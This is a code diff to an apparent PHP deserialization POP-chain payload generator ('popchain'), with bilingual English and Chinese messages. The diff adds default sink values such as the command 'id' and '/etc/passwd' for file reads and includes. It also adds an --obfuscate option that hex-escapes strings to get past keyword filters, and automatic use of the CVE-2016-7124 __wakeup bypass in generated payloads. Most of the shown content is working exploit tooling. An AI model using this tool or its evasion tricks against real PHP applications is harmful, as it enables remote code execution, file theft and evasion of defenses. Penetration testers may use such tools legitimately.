@@ -14,7 +14,7 @@ use PopChain\Payload\PayloadBuilder;
  */
 final class Application
 {
-    public const VERSION = '1.2.1';
+    public const VERSION = '1.2.2';
 
     private const DEFAULT_ENTRIES = ['__destruct', '__wakeup', '__unserialize'];
 
@@ -25,13 +25,30 @@ final class Application
     ];
 
     /** 不带值的布尔选项。 */
-    private const BOOLEAN_OPTIONS = ['json', 'stdin', 'include-vendor', 'help', 'version'];
+    private const BOOLEAN_OPTIONS = ['json', 'stdin', 'include-vendor', 'obfuscate', 'help', 'version'];
 
     /** 必须是正整数的选项。 */
     private const NUMERIC_OPTIONS = ['max-depth', 'max-chains'];
 
     /** 反序列化时会被自动调用的入口；其余魔术方法需要外部触发。 */
     private const DESERIALIZE_ENTRIES = ['__destruct', '__wakeup', '__unserialize'];
+
+    /** 没给 --cmd 时，按 sink 分类给一个合适的默认值。 */
+    private const DEFAULT_VALUES = [
+        'rce' => 'id',
+        'file_read' => '/etc/passwd',
+        'file_write' => '/tmp/popchain.txt',
+        'file_delete' => '/tmp/popchain.txt',
+        'file_move' => '/tmp/popchain.txt',
+        'file_copy' => '/tmp/popchain.txt',
+        'file_perms' => '/tmp/popchain.txt',
+        'include' => '/etc/passwd',
+        'deserialize' => 'a:0:{}',
+        'ssrf' => 'http://127.0.0.1/',
+        'env' => 'POPCHAIN=1',
+        'var' => 'popchain=1',
+        'mail' => 'a@b.test',
+    ];
 
     private const MESSAGES = [
         'en' => [
@@ -54,6 +71,8 @@ final class Application
             'no_classes' => 'No PHP classes found in: {path}',
             'output_failed' => 'Cannot write output file: {file}',
             'external_entry' => 'note: this entry needs an external trigger; unserializing the payload alone will not call it',
+            'incomplete_payload' => 'note: the sink value could not be placed in the payload; adjust the chain by hand',
+            'wakeup_bypass' => 'note: this property is reset by __wakeup; the payload is deliberately malformed (declared property count > actual) so unserialize fails and __wakeup is skipped while destructors still run (CVE-2016-7124/SplDoublyLinkedList-style bypass)',
             'arg' => 'arg',
             'via' => 'via',
         ],
@@ -77,6 +96,8 @@ final class Application
             'no_classes' => '没有在 {path} 里找到 PHP 类',
             'output_failed' => '无法写入输出文件: {file}',
             'external_entry' => '注意：该入口需要外部触发，单独反序列化 payload 不会调用它',
+            'incomplete_payload' => '注意：sink 的值没能写进 payload，需要手工调整这条链',
+            'wakeup_bypass' => '注意：这个属性会被 __wakeup 重置；payload 故意写成不合法（声明属性数大于实际），让 unserialize 失败、__wakeup 跳过而析构照跑（CVE-2016-7124）',
             'arg' => '参数',
             'via' => 'via',
         ],
@@ -269,12 +290,13 @@ Options:
                        --entry=all enables every magic method
   --class=Entry        Only keep chains whose entry class matches
   --sink=system        Only keep chains hitting the given sink
-  --cmd=id             Value written to the sink argument (default: id)
+  --cmd=value          Value written to the sink argument (default depends on the sink category)
   --output=file        Write payloads to a file (JSON in --json mode)
   --max-depth=8        Maximum chain depth
   --max-chains=50      Maximum number of chains
   --include-vendor     Also scan vendor/
   --json               JSON output
+  --obfuscate          Emit strings as S: hex escapes, hiding keywords from regex filters
 
 Examples:
   popchain scan ./src
@@ -311,12 +333,13 @@ php_pop_framework v{$version} — PHP 反序列化 POP 链自动生成器
                        --entry=all 启用全部魔术方法入口
   --class=Entry        只保留指定类（短名或完整命名空间）作为入口的链
   --sink=system        只保留指定 sink 函数的链
-  --cmd=id             sink 参数要写入的值（默认 id）
+  --cmd=值             sink 参数要写入的值（默认值按 sink 分类决定）
   --output=文件        把 payload 写入文件（JSON 模式写 JSON）
   --max-depth=8        链最大深度
   --max-chains=50      最多输出多少条链
   --include-vendor     连 vendor/ 目录一起扫描
   --json               以 JSON 输出
+  --obfuscate          字符串改用 S: 十六进制转义，绕过关键字过滤
 
 示例:
   popchain scan ./src
@@ -467,11 +490,14 @@ TXT;
             ));
         }
 
-        $builder = new PayloadBuilder($classes);
-        $value = (string) self::option($options, 'cmd', 'id');
+        $builder = new PayloadBuilder($classes, (bool) self::option($options, 'obfuscate', false));
+        $customValue = self::option($options, 'cmd', null);
 
         $records = [];
         foreach ($chains as $chain) {
+            $value = is_string($customValue) && $customValue !== ''
+                ? $customValue
+                : self::defaultValue($chain->sink?->category);
             $payloadString = $builder->build($chain, $value);
             $records[] = [
                 'entry' => $chain->entryClass->name . '::' . $chain->entryMethod->name,
@@ -492,6 +518,7 @@ TXT;
                 ],
                 'payload' => $payloadString,
                 'payload_complete' => $builder->sinkValueWritten,
+                'needs_wakeup_bypass' => $builder->wakeupBypassUsed,
             ];
         }
 
@@ -538,6 +565,9 @@ TXT;
             if ($record['sink'] !== null && !$record['payload_complete']) {
                 echo '    ', self::t('incomplete_payload'), "\n";
             }
+            if ($record['needs_wakeup_bypass']) {
+                echo '    ', self::t('wakeup_bypass'), "\n";
+            }
             foreach ($record['edges'] as $edge) {
                 printf(
                     "    %s %-14s \$this->%-14s %s:%d\n",
@@ -582,6 +612,14 @@ TXT;
     }
 
     /** 终端展示用：把 payload 里的 NUL 字节转义，避免复制/管道被当二进制。 */
+    private static function defaultValue(?string $category): string
+    {
+        if ($category !== null && isset(self::DEFAULT_VALUES[$category])) {
+            return self::DEFAULT_VALUES[$category];
+        }
+        return 'id';
+    }
+
     private static function displayable(string $payload): string
     {
         return str_replace("\0", '\0', $payload);
